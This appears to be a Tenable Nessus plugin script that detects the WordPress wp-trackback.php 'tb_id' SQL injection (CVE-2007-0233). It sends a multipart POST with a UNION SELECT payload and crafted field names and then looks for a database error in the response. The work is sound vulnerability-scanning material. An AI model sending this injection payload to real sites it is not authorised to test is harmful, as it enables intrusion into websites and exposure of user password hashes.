#
# Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24014);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2014/10/01 01:43:19 $");

  script_cve_id("CVE-2007-0233");
  script_bugtraq_id(21983);
  script_osvdb_id(36860);
  script_xref(name:"EDB-ID", value:"3109");

  script_name(english:"WordPress Trackback 'wp-trackback.php' 'tb_id' Parameter SQL Injection");
  script_summary(english:"Attempts to generate a SQL error.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
SQL injection attacks.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress on the remote host fails to properly sanitize
input to the 'tb_id' parameter of the 'wp-trackback.php' script before
using it in database queries. An unauthenticated, remote attacker can
leverage this issue to launch SQL injection attacks against the
affected application, including discovery of password hashes of
WordPress users.

Note that successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled and that the remote version of
PHP be older than 4.4.3 or 5.1.4.");
  # http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ccaf872d");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/01/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2014 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Make sure the affected script exists.
url = dir + "/wp-trackback.php";
w = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
res = w[2];

# If it does...
if ("need an ID for this to work" >< res)
{
  # Try to exploit the flaw to generate a SQL error.
  sql = rand() + "/**/UNION/**/SELECT/**/" + SCRIPT_NAME;
  bound = "bound";
  boundary = string("--", bound);
  postdata =
    boundary + '\r\n' +
    'Content-Disposition: form-data; name="title"\r\n' +
      'Content-Type: text/plain\r\n' +
      '\r\n' +
      SCRIPT_NAME + '\r\n' +

      boundary + "\r\n" +
      'Content-Disposition: form-data; name="url"\r\n' +
      'Content-Type: text/plain\r\n' +
      '\r\n' +
      'nessus\r\n' +

      boundary + "\r\n" +
      'Content-Disposition: form-data; name="blog_name"\r\n' +
      'Content-Type: text/plain\r\n' +
      '\r\n' +
      'nessus\r\n' +

      boundary + "\r\n" +
      'Content-Disposition: form-data; name="tb_id"\r\n' +
      'Content-Type: text/plain\r\n' +
      '\r\n' +
      sql + '\r\n' +

      boundary + "\r\n" +
      'Content-Disposition: form-data; name="496546471"\r\n' +
      'Content-Type: text/plain\r\n' +
      '\r\n' +
      '1\r\n' +

      boundary + "\r\n" +
      'Content-Disposition: form-data; name="1740009377"\r\n' +
      'Content-Type: text/plain\r\n' +
      '\r\n' +
      '1\r\n' +

      boundary + '--\r\n';
  w = http_send_recv3(method: "POST",  item: url+"?tb_id=1", port:port,
      content_type: "multipart/form-data; boundary="+bound,
      data: postdata, exit_on_fail:TRUE);
  res = w[2];

  # There's a problem if we see an error.
  if (
    "class='wpdberror'" >< res &&
    " WHERE ID = " + sql + "</code>" >< res
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
